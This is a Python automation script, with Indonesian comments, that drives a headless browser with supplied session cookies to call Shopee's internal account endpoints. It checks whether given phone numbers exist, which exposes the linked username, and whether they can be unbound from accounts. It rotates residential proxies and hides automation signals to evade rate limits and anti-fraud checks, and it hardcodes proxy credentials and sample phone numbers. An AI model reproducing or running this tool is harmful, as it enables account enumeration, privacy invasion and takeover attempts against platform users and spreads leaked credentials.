# -*- coding: utf-8 -*-
"""
proxy_probe.py — check_unbind_phone lewat proxy residensial Indonesia.

Endpoint yang benar (terbukti dari enum Shopee):
    POST /api/v4/account/management/check_unbind_phone  {phone}
        error=0        -> BISA UNBIND
        error=12301115 -> NOT_ALLOW_UNBIND_PHONE
        error=90309999 -> anti-fraud token ditolak (perlu ganti sesi)

Setiap nomor pakai sesi proxy baru (lifetime-2 = rotate tiap 2 menit),
supaya tidak kena rate limit IP.

Usage:
  python3 proxy_probe.py .ck_new 089601416330 087876125616
"""
from __future__ import annotations

import json
import random
import sys
import time
from pathlib import Path

from playwright.sync_api import sync_playwright

BASE = Path("/root/shopee-verify")
HOME = "https://shopee.co.id/"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36")

# kredensial proxy (session bisa diganti untuk IP baru)
PX_USER = "Vsx_Premium_B65xVWHdYyta-type-residential-country-id-lifetime-2-session-{sid}"
PX_PASS = "3263bd4d-0f5c-4952-a512-a43708e927a1"
PX_HOST = "sg.gb.vsproxy.org:12000"


def proxy_for(session_id: str) -> dict:
    # Chromium tak bisa SOCKS5+auth -> pakai relay lokal ke SOCKS5 upstream
    return {"server": "http://127.0.0.1:18080"}


FETCH = r"""
async (a) => {
  const csrfM = document.cookie.match(/(^| )csrftoken=([^;]+)/);
  const csrf = csrfM ? csrfM[2] : '';
  const hex = Array.from(crypto.getRandomValues(new Uint8Array(8)))
                  .map(b => b.toString(16).padStart(2,'0')).join('');
  const h = {'Content-Type':'application/json','Accept':'application/json',
    'x-api-source':'pc','x-requested-with':'XMLHttpRequest',
    'x-shopee-language':'id','af-ac-enc-dat':hex};
  if (csrf) h['x-csrftoken'] = csrf;
  try {
    const r = await fetch(a.url, {method:'POST', headers:h,
      credentials:'include', body:JSON.stringify(a.body)});
    const t = await r.text();
    let j; try { j = JSON.parse(t); } catch(e) { j = {_raw:t.slice(0,250)}; }
    return {s:r.status, j};
  } catch(e) { return {s:0, j:{_exc:String(e)}}; }
}
"""

CODE = {
    0: "BISA_UNBIND",
    12301115: "NOT_ALLOW_UNBIND_PHONE",
    12301116: "ACCOUNT_OR_PHONE_RESTRICT",
    12301004: "PHONE_REUSE_EXCEED_LIMIT",
    12301029: "ACCOUNT_BANNED",
    12301031: "RECYCLED_PHONE_V4",
    12301016: "PHONE_NOT_EXIST",
    10013: "PHONE_NOT_FOUND",
    90309999: "RATE_LIMITED",
    12301066: "CHANGE_PHONE_ONGOING",
    12301064: "NEW_DEVICE_COOLDOWN",
}


def jar_from(p):
    jar = {}
    for seg in open(p).read().replace("\n", " ").split(";"):
        seg = seg.strip()
        if seg and "=" in seg:
            k, v = seg.split("=", 1)
            jar[k.strip()] = v
    return jar


def norm(p):
    d = "".join(c for c in str(p or "") if c.isdigit())
    if d.startswith("0"):
        d = "62" + d[1:]
    elif d.startswith("8"):
        d = "62" + d
    return d


def run_page(pw, jar, session_id):
    b = pw.chromium.launch(headless=True, proxy=proxy_for(session_id), args=[
        "--no-sandbox", "--disable-dev-shm-usage",
        "--disable-blink-features=AutomationControlled",
        "--ignore-certificate-errors"])
    ctx = b.new_context(user_agent=UA, locale="id-ID",
                        viewport={"width": 1366, "height": 900},
                        timezone_id="Asia/Jakarta", ignore_https_errors=True)
    page = ctx.new_page()
    try:
        ctx.add_cookies([{"name": k, "value": v, "domain": ".shopee.co.id",
                          "path": "/", "secure": True, "sameSite": "None"}
                         for k, v in jar.items()])
    except Exception:
        pass
    cdp = ctx.new_cdp_session(page)
    cdp.send("Network.enable")
    for k, v in jar.items():
        try:
            cdp.send("Network.setCookie", {"name": k, "value": v,
                                           "domain": ".shopee.co.id",
                                           "path": "/", "secure": True})
        except Exception:
            pass
    page.goto(HOME, wait_until="domcontentloaded", timeout=90000)
    page.wait_for_timeout(6000)
    return b, page


def main():
    ck = sys.argv[1] if len(sys.argv) > 1 else str(BASE / ".ck_new")
    raw = sys.argv[2:] or ["089601416330", "087876125616"]
    phones = [norm(x) for x in raw]
    jar = jar_from(ck)

    with sync_playwright() as pw:
        session = "s" + "".join(random.choices("0123456789", k=6))
        print(f"[proxy] session={session}")
        b, page = run_page(pw, jar, session)
        print(f"[warm] {page.url[:65]}")

        ip = "?"
        try:
            ip = page.evaluate("""async () => {
                const r = await fetch('https://api.ipify.org?format=json');
                const j = await r.json(); return j.ip;
            }""")
        except Exception:
            pass
        print(f"[ip] {ip}\n")

        me = page.evaluate(FETCH, {"url": "/api/v4/account/basic/get_account_info",
                                   "body": {}})
        print(f"[me] {json.dumps(me['j'], ensure_ascii=False)[:180]}\n")

        for ph in phones:
            print("=" * 72)
            print(f"PHONE {ph}")
            print("=" * 72)

            ex = page.evaluate(FETCH, {"url": "/api/v4/account/basic/check_phone_exist",
                                       "body": {"phone": ph}})["j"]
            d = ex.get("data") or {}
            print(f"  exist          : {d.get('exist')} @"
                  f"{((d.get('user') or {}).get('username'))}")

            ub = page.evaluate(FETCH, {"url": "/api/v4/account/management/check_unbind_phone",
                                       "body": {"phone": ph}})["j"]
            err = ub.get("error")
            verdict = CODE.get(err, f"UNKNOWN_{err}")
            print(f"  check_unbind   : error={err} -> {verdict}")
            print(f"  raw            : {json.dumps(ub, ensure_ascii=False)[:220]}")
            print()

        b.close()


if __name__ == "__main__":
    main()
